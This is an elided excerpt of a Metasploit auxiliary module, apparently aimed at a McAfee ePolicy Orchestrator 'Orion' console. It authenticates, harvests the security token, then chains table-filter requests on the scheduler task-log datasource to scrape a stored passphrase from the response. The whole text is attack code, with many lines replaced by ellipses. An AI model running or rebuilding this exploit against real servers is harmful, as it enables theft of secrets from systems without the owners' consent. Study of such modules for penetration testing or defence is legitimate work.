...
class MetasploitModule < Msf::Auxiliary
  ...
  def run
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'orionSplashScreen.do'))
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'j_security_check'),
                           'method' => 'POST',
                           'vars_post' => {
    ...
    fail_with(Failure::Unknown, 'Authentication failed') if res.code != 302
    ...
    auth_token = Regexp.last_match(1) if res.body =~ /id="orion.user.security.token" value="(.*)"\/>/

    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'orionTab.do'),
                           'vars_get' => {
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'loadTableData.do'),
                           'vars_get' => {
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'orionEditTableFilter.do'),
                           'vars_get' => {
                             'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'orionTableUpdateState.do'),
                           'method' => 'POST',
                           'vars_post' => {
                             'dataSourceAttr' => 'scheduler.tasklog.datasource.attr',
                             'tableId' => 'taskLogTable',
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'loadDisplayType.do'),
                           'method' => 'POST',
                           'vars_post' => {
    ...
    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'core', 'orionUpdateTableFilter.do'),
                           'method' => 'POST',
                           'vars_post' => {
                             'orion.user.security.token' => auth_token,
                             'datasourceAttr' => 'scheduler.tasklog.datasource.attr',
    ...
    passphrase = Regexp.last_match(1) if res.body =~ /passphrase=(.*?)\\u003/
